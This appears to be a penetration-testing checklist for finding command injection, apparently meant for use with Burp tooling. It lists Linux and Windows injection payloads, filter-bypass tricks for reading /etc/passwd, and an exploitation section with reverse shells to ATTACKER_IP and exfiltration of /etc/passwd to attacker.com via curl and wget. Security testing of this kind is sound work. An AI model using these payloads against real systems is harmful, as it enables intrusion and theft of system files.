# Command Injection Detection

## Objective

Detect vulnerabilities that allow executing arbitrary system commands on the server.

## Typical injection points

- System features: Ping, DNS lookup, file conversion
- Parameters: `?host=`, `?ip=`, `?cmd=`, `?exec=`
- Filenames processed by the system
- Headers used in scripts

## Test steps

### 1. Identify suspicious features

Look for:
- Network tools (ping, traceroute, nslookup)
- File processing (convert, ffmpeg)
- PDF reports/exports
- System integrations

### 2. Detection payloads

**Command separators (Linux):**
```
; id
| id
|| id
& id
&& id
$(id)
`id`
%0aid
```

**Command separators (Windows):**
```
& whoami
| whoami
|| whoami
%0awhoami
```

**Blind detection payloads (time-based):**
```
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1
|| ping -n 10 127.0.0.1
```

**DNS payloads (out-of-band):**
```
; nslookup burp-collaborator.com
| dig burp-collaborator.com
$(curl burp-collaborator.com)
```

### 3. Filter bypasses

**Spaces:**
```
cat</etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
```

**Forbidden characters:**
```
wh$()oami
w'h'o'a'm'i
w"h"o"a"m"i
/???/??t /???/p??s??  (wildcards)
```

**Encoding:**
```
$(printf '\x69\x64')  -> id
$'\151\144'  -> id
```

### 4. Exploitation

**Reverse shell Linux:**
```
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc -e /bin/bash ATTACKER_IP 4444
```

**Exfiltration:**
```
; cat /etc/passwd | base64 | curl -d @- http://attacker.com
; wget http://attacker.com/$(whoami)
```

### 5. Document the finding

If vulnerable:
```
1. burp_cvss_calculate(...) to get the vector
2. burp_create_finding(
     title: "Command Injection on [endpoint]",
     cvss_vector: "<from calculator>",
     description: "...",
     references: ["CWE-78"]
   )
```

## Vulnerability indicators

- Command output in response
- Delay matching sleep/ping
- DNS request to collaborator
- Revealing system errors

## Protection indicators

- No system command calls
- Strict whitelist of allowed values
- Special character escaping
- Using APIs instead of shell
